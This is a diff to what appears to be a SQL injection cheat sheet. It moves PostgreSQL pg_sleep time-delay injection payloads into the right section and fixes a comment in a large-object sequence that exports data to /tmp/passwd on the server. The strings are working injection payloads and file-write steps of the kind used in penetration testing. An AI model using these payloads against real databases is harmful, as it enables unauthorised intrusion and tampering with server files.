@@ -609,6 +609,8 @@ QUERY-1; QUERY-2
 
 ```sql
 || SELECT pg_sleep(10)
+' || (SELECT '' FROM pg_sleep(5)) || '
+', (SELECT 'blabla' FROM pg_sleep(5))--
 ```
 
 ### Conditional Time Delays
@@ -699,7 +701,7 @@ xxd -ps -c 99999999999 xaa
 ```sql
 SELECT lo_create(31337);
 INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('726f6f74<SNIP>6269','HEX'));
-SELECT lo_put(31337, 0, 'this is a test'); #in case INSERT IS FORBIDDEN
+SELECT lo_put(31337, 0, 'this is a test'); --in case INSERT IS FORBIDDEN
 SELECT lo_export(31337, '/tmp/passwd');
 SELECT lo_unlink(31337);
 ```
@@ -798,8 +800,6 @@ QUERY-1; QUERY-2
 
 ```sql
 SELECT SLEEP(10)
-' || (SELECT '' FROM pg_sleep(5)) || '
-', (SELECT 'blabla' FROM pg_sleep(5))--
 ```
 
 ### Conditional Time Delays
